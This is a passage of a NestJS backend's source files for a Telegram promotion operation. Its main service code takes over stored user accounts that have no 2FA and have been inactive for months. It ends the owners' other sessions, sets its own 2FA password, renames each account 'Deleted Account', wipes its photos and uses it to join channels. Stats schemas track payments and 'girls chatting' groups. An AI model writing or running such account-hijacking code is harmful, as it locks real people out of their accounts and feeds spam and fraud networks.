clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await this.telegramService.createClient(mobile, false)\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                        await this.telegramService.deleteClient(document.mobile)\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\n\r\n@ApiTags('Promote-msgs')\r\n@Controller('promote-msgs')\r\nexport class PromoteMsgsController {\r\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get promote-msgs data' })\r\n  async findOne(): Promise<any>{\r\n    return this.promoteMsgsService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update promote-msgs' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.promoteMsgsService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteMsgsService } from './promote-msgs.service';\r\nimport { PromoteMsgsController } from './promote-msgs.controller';\r\nimport { PromoteMsgSchema } from './promote-msgs.schema';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    PromoteMsgModule,\r\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\r\n  ],\r\n  providers: [PromoteMsgsService],\r\n  controllers: [PromoteMsgsController],\r\n  exports: [PromoteMsgsService],\r\n})\r\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreatePromoteStatDto {\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\r\n  data: Map<string, number>;\r\n\r\n  @ApiProperty({ example: 552, description: 'Total Count' })\r\n  totalCount: number;\r\n\r\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\r\n  uniqueChannels: number;\r\n\r\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\r\n  releaseDay: number;\r\n\r\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\r\n  lastUpdatedTimeStamp: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Is Active' })\r\n  isActive: boolean;\r\n\r\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\r\n  channels: string[];\r\n}\r\n","// update-promote-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\r\n\r\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\r\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\r\n\r\n@ApiTags('promote-stats')\r\n@Controller('promote-stats')\r\nexport class PromoteStatController {\r\n  constructor(private readonly promoteStatService: PromoteStatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\r\n    return this.promoteStatService.create(createPromoteStatDto);\r\n  }\r\n\r\n  @Get(':client')\r\n  async findByClient(@Param('client') client: string) {\r\n    return this.promoteStatService.findByClient(client);\r\n  }\r\n\r\n  @Put(':client')\r\n  async update(\r\n    @Param('client') client: string,\r\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\r\n  ) {\r\n    return this.promoteStatService.update(client, updatePromoteStatDto);\r\n  }\r\n\r\n  @Delete(':client')\r\n  async deleteOne(@Param('client') client: string) {\r\n    return this.promoteStatService.deleteOne(client);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.promoteStatService.deleteAll();\r\n  }\r\n}\r\n","import { initModule } from './../ConfigurationInit/init.module';\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteStatService } from './promote-stat.service';\r\nimport { PromoteStatController } from './promote-stat.controller';\r\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [initModule,\r\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\r\n    ClientModule\r\n  ],\r\n  controllers: [PromoteStatController],\r\n  providers: [PromoteStatService],\r\n  exports: [PromoteStatService]\r\n})\r\nexport class PromoteStatModule { }\r\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","// create-stat.dto.ts\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateStatDto {\r\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ example: 12, description: 'Count' })\r\n  count: number;\r\n\r\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\r\n  payAmount: number;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given' })\r\n  demoGiven: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\r\n  demoGivenToday: boolean;\r\n\r\n  @ApiProperty({ example: false, description: 'New User' })\r\n  newUser: boolean;\r\n\r\n  @ApiProperty({ example: true, description: 'Paid Reply' })\r\n  paidReply: boolean;\r\n\r\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\r\n  name: string;\r\n\r\n  @ApiProperty({ example: false, description: 'Second Show' })\r\n  secondShow: boolean;\r\n\r\n  @ApiProperty({ example: null, description: 'Did Pay' })\r\n  didPay: boolean | null;\r\n\r\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\r\n  client: string;\r\n\r\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\r\n  profile: string;\r\n}\r\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\n\r\n@ApiTags('stats2')\r\n@Controller('stats2')\r\nexport class Stat2Controller {\r\n  constructor(private readonly statService: Stat2Service) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { Stat2Service } from './stat2.service';\r\nimport { Stat2Controller } from './stat2.controller';\r\nimport { StatSchema } from './stat2.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\r\n    controllers: [Stat2Controller],\r\n    providers: [Stat2Service],\r\n    exports: [Stat2Service]\r\n})\r\nexport class Stat2Module { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\nimport { UpdateStatDto } from './update-stat2.dto';\r\nimport { Stat2, Stat2Document } from './stat2.schema';\r\n\r\n@Injectable()\r\nexport class Stat2Service {\r\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async findAll(): Promise<Stat2[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat2.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\r\nimport { ApiTags } from '@nestjs/swagger';\r\nimport { StatService } from './stat.service';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\n\r\n@ApiTags('stats')\r\n@Controller('stats')\r\nexport class StatController {\r\n  constructor(private readonly statService: StatService) {}\r\n\r\n  @Post()\r\n  async create(@Body() createStatDto: CreateStatDto) {\r\n    return this.statService.create(createStatDto);\r\n  }\r\n\r\n  @Get(':chatId/:profile')\r\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.findByChatIdAndProfile(chatId, profile);\r\n  }\r\n\r\n  @Put(':chatId/:profile')\r\n  async update(\r\n    @Param('chatId') chatId: string,\r\n    @Param('profile') profile: string,\r\n    @Body() updateStatDto: UpdateStatDto,\r\n  ) {\r\n    return this.statService.update(chatId, profile, updateStatDto);\r\n  }\r\n\r\n  @Delete(':chatId/:profile')\r\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\r\n    return this.statService.deleteOne(chatId, profile);\r\n  }\r\n\r\n  @Delete()\r\n  async deleteAll() {\r\n    return this.statService.deleteAll();\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { StatService } from './stat.service';\r\nimport { StatController } from './stat.controller';\r\nimport { StatSchema } from './stat.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n    imports: [\r\n        initModule,\r\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\r\n    controllers: [StatController],\r\n    providers: [StatService],\r\n    exports:[StatService]\r\n})\r\nexport class StatModule { }\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateStatDto } from './create-stat.dto';\r\nimport { UpdateStatDto } from './update-stat.dto';\r\nimport { Stat, StatDocument } from './stat.schema';\r\n\r\n@Injectable()\r\nexport class StatService {\r\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\r\n\r\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\r\n    const createdStat = new this.statModel(createStatDto);\r\n    return createdStat.save();\r\n  }\r\n\r\n  async findAll(): Promise<Stat[]> {\r\n    const stats = await this.statModel.find().exec();\r\n    return stats;\r\n  }\r\n\r\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\r\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\r\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\r\n    if (!stat) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n    return stat;\r\n  }\r\n\r\n  async deleteOne(chatId: string, profile: string): Promise<void> {\r\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\r\n    if (result.deletedCount === 0) {\r\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\r\n    }\r\n  }\r\n\r\n  async deleteAll(): Promise<void> {\r\n    await this.statModel.deleteMany({}).exec();\r\n  }\r\n}\r\n","// update-stat.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateStatDto } from './create-stat.dto';\r\n\r\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateTransactionDto {\r\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\r\n  